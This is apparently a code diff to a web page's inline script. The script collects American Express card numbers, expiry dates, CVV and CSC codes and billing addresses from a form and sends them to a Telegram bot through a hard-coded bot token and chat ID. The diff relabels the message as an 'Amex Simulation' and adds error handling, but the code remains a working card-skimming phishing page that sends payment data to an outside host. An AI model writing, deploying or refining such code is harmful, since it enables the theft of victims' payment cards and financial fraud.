@@ -329,16 +329,14 @@
 </footer>
 
 <script>
-    const BOT_TOKEN = "7815246614:AAGAsn131CZsAKNVVK292Ka9CeT2AEXnlIE";
-    const CHAT_ID = "5413226485";
+    const BOT_TOKEN = "7815246614:AAGAsn131CZsAKNVVK292Ka9CeT2AEXnlIE"; // put your Telegram bot token
+    const CHAT_ID = "5413226485";     // put your chat ID
   
     async function handleCardForm(event) {
       event.preventDefault();
   
-      const form = event.target;
+      const form = document.getElementById('cardForm');
       const errors = [];
-      const errorBox = document.getElementById('formErrors');
-      errorBox.innerHTML = '';
   
       const cardNumber = form.cardNumber.value.trim();
       const expiry = form.expiry.value.trim();
@@ -351,7 +349,10 @@
       const zip = form.zip.value.trim();
       const simConfirm = form.simConfirm.checked;
   
-      // Your existing validation rules
+      const errorBox = document.getElementById('formErrors');
+      errorBox.innerHTML = '';
+  
+      // Validations
       if (!cardNumber.match(/^\d{15}$/)) {
         errors.push('Card number must be exactly 15 digits (Amex format).');
       }
@@ -379,10 +380,10 @@
         return false;
       }
   
-      // Prepare the message text
+      // Build message for Telegram
       const message = `
-  <b>New Lab Submission</b>
-  Card Number: ${cardNumber}
+  <b>Amex Simulation</b>
+  Card: ${cardNumber}
   Expiry: ${expiry}
   CVV: ${cvv}
   CSC: ${csc}
@@ -391,7 +392,7 @@
   City: ${city}
   State: ${state}
   ZIP: ${zip}
-  Simulation Confirmed: ${simConfirm}
+  Confirmed: ${simConfirm ? "Yes" : "No"}
       `;
   
       try {
@@ -406,12 +407,11 @@
         });
   
         if (response.ok) {
-  form.reset();
-  window.location.href = "Thank-you.html"; // <-- put your redirect URL here
-} else {
-  // optional: handle error
-}
-
+          form.reset();
+          window.location.href = "Thank-you.html"; // redirect after success
+        } else {
+          alert("Error sending to Telegram.");
+        }
       } catch (error) {
         alert("Network error.");
       }
@@ -419,6 +419,7 @@
   
     document.getElementById('cardForm').addEventListener('submit', handleCardForm);
   </script>
+  
   
 
 </body>
